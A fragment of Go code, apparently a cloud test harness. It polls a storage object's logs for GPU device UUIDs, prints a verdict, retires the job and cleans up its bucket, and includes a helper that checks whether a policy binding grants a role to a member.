			fmt.Printf("C211M_GCS_OBJECT name=%s http=%d bytes=%d verbatim=%s\n", o, ost, len(obody), c211xTrunc(obody, 1200))
			if len(obody) > len(logText) {
				logText = obody
			}
		}
		if strings.Contains(logText, "GPU-") || time.Until(deadline) < 2*time.Minute {
			break
		}
		time.Sleep(20 * time.Second)
	}
	uuids := []string{}
	for _, ln := range strings.Split(logText, "\n") {
		if strings.Contains(ln, "C211M_") {
			fmt.Printf("C211M_LOG %s\n", c211xTrunc(ln, 400))
		}
		for _, mm := range c211xUUIDRe.FindAllString(ln, -1) {
			dupe := false
			for _, u := range uuids {
				if u == mm {
					dupe = true
				}
			}
			if !dupe {
				uuids = append(uuids, mm)
			}
		}
	}
	sort.Strings(uuids)
	fmt.Printf("C211M_LOG_SUMMARY log_bytes=%d uuids=%d %s\n", len(logText), len(uuids), strings.Join(uuids, ","))

	// retire + absence proof, then bucket cleanup
	dst, getAfter, note := c211mRetire(ftok, c211mRegion, jobName)
	fmt.Printf("C211M_ABSENCE delete_http=%d get_after=%d note=%s\n", dst, getAfter, c211xTrunc(note, 120))
	if bucket != "" {
		fmt.Printf("C211M_BUCKET_CLEANUP %s\n", c211mBucketCleanup(ftok, bucket))
	}

	verdict := "NO_DEVICE_LINE"
	if len(uuids) > 0 {
		verdict = fmt.Sprintf("DEVICE_PROVEN_%d", len(uuids))
	}
	fmt.Printf("C211M_VERDICT %s state=%s granted=%d\n", verdict, state, granted)
	fmt.Printf("C211M_DONE at=%s elapsed=%ds\n", time.Now().UTC().Format("2006-01-02T15:04:05Z"), int(time.Since(started).Seconds()))
}

// c211r4BindingPresent2 mirrors the r4 round helper (kept local so the helper file
// stays byte-identical to the proven i124308 copy).
func c211r4BindingPresent2(pol map[string]interface{}, role, member string) bool {
	bindings, _ := pol["bindings"].([]interface{})
	for _, b := range bindings {
		bm, _ := b.(map[string]interface{})
		if c211xStr(bm, "role") != role {
			continue
		}
		members, _ := bm["members"].([]interface{})
		for _, m := range members {
			if s, ok := m.(string); ok && s == member {
				return true
			}
		}
	}
	return false
}
